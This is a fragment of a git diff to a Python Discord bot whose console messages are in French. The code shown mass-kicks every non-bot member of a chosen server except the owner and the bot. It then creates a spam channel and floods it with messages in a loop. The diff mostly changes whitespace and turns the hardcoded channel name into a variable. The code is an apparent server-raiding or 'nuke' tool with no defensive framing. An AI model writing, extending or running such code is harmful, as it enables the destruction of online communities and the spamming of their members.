             print(Fore.RED + "Kick de tous les membres...")
             members_to_kick = [member for member in self.selected_guild.members 
                               if not member.bot and member != self.selected_guild.owner and member != self.user]
-            
+
             kicked_count = 0
             for member in members_to_kick:
                 try:
@@ -1131,15 +1273,15 @@ class DiscordBot(discord.Client):
                     await asyncio.sleep(0.3)
                 except Exception as e:
                     print(Fore.RED + f"Erreur kick {member.display_name}: {e}")
-                    
+
             print(Fore.RED + f"{kicked_count} membres kickés")
             print(Fore.RED + "Création du salon de spam...")
             try:
                 spam_channel = await self.selected_guild.create_text_channel(
-                    name="pub-tiktok",
+                    name=salon_name,
                     reason="pub command spam channel"
                 )
-                
+
                 print(Fore.RED + "Spam en cours dans le nouveau salon...")
                 for i in range(20):
                     try:
@@ -1147,7 +1289,7 @@ class DiscordBot(discord.Client):
                         await asyncio.sleep(0.2)
                     except Exception as e:
                         print(Fore.RED + f"Erreur spam message {i+1}: {e}")
-                        
+
             except Exception as e:
                 print(Fore.RED + f"Erreur création salon spam: {e}")
 
